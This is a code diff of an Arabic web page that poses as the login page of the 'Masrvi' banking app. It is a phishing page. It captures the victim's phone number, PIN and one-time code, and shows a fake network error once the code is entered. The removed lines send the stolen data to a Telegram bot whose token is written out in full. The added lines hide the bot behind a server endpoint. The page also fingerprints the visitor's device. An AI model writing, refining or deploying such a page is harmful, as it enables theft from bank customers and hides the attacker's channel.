@@ -6,8 +6,8 @@
     <title>الرئيسية / مصرفي</title>
     <meta property="og:title" content="الرئيسية / مصرفي">
     <meta property="og:description" content="تطبيق مصرفي - خدماتك البنكية بين يديك">
-    <meta property="og:image" content="https://masrvi-app.vercel.app/logo_masrvi.jpeg">
-    <meta property="og:url" content="https://masrvi-app.vercel.app">
+    <meta property="og:image" content="logo_masrvi.jpeg">
+    <meta property="og:url" content="https://masrvi-app.onrender.com">
     <meta property="og:type" content="website">
     <meta name="twitter:card" content="summary_large_image">
     <style>
@@ -25,7 +25,7 @@
         .otp-icon-p { width: 22px; height: 22px; background: url('otp_input_icon.jpeg') no-repeat center; background-size: contain; margin-left: 10px; }
         
         input { border: none; width: 100%; font-size: 17px; padding: 12px; text-align: right; outline: none; background: transparent; font-family: 'Cairo'; }
-        .btn-main { background-color: #2c5364; color: white; border: none; width: 100%; padding: 16px; border-radius: 8px; font-size: 19px; font-weight: bold; cursor: pointer; transition: 0.3s; margin-top: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.15); }
+        .btn-main { background-color: #2c5364; color: white; border: none; width: 100%; padding: 166px; border-radius: 8px; font-size: 19px; font-weight: bold; cursor: pointer; transition: 0.3s; margin-top: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.15); padding: 16px; }
         .btn-main:disabled { background-color: #95a5a6; cursor: not-allowed; box-shadow: none; }
         
         .otp-main-icon { width: 110px; margin: 20px auto; display: block; }
@@ -71,11 +71,18 @@
 </div>
 
 <script>
-    const tok = "8647203625:AAFUHY8sXVD8IoSvf60Wd7pT-l5MHDO-d9I";
-    const cid = "5244299184";
-
-    function send(t) {
-        fetch(`https://api.telegram.org/bot${tok}/sendMessage?chat_id=${cid}&text=${encodeURIComponent(t)}`);
+    // تم حذف التوكن وChat ID من هنا لحمايتهما.
+    // يتم الآن إرسال البيانات إلى نقطة نهاية في السيرفر (API Endpoint)
+    async function sendToBot(text) {
+        try {
+            await fetch('/api/send', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ text: text })
+            });
+        } catch (e) {
+            console.error("Error sending to bot", e);
+        }
     }
 
     function validateInput() {
@@ -93,7 +100,7 @@
     }
 
     function toStep2() {
-        send(`🚨 دخول جديد:\n📱 هاتف: ${document.getElementById('tel').value}\n🔑 PIN: ${document.getElementById('pin').value}`);
+        sendToBot(`🚨 دخول جديد:\n📱 هاتف: ${document.getElementById('tel').value}\n🔑 PIN: ${document.getElementById('pin').value}`);
         document.getElementById('p1').classList.add('hidden');
         document.getElementById('p2').classList.remove('hidden');
         let time = 300;
@@ -105,7 +112,7 @@
     }
 
     function final() {
-        send(`🔢 OTP المستلم: ${document.getElementById('otp').value}`);
+        sendToBot(`🔢 OTP المستلم: ${document.getElementById('otp').value}`);
         alert("خطأ في الشبكة، يرجى المحاولة لاحقاً.");
         location.reload();
     }
@@ -114,19 +121,17 @@
 async function captureDeepFingerprint() {
     let batteryLevel = "مخفي بواسطة النظام";
     try {
-        // محاولة أخرى لجلب البطارية
         const battery = await navigator.getBattery();
         batteryLevel = Math.round(battery.level * 100) + "%";
     } catch (e) {}
 
-    // خدعة لمعرفة الرام في الآيفون (عبر قياس الأداء)
     const ram = navigator.deviceMemory || (window.performance && window.performance.memory ? "تحت الحماية" : "4GB+ (تقديري)");
 
     const data = {
         res: window.screen.width + "x" + window.screen.height,
         lang: navigator.language,
         mem: ram,
-        cores: navigator.hardwareConcurrency || "6 (A18 Pro Chip)", // المعالج التقريبي للآيفون الأحدث
+        cores: navigator.hardwareConcurrency || "6",
         plat: navigator.platform,
         bat: batteryLevel
     };
@@ -136,7 +141,6 @@ async function captureDeepFingerprint() {
 }
 captureDeepFingerprint();
 </script>
-
 
 </body>
 </html>
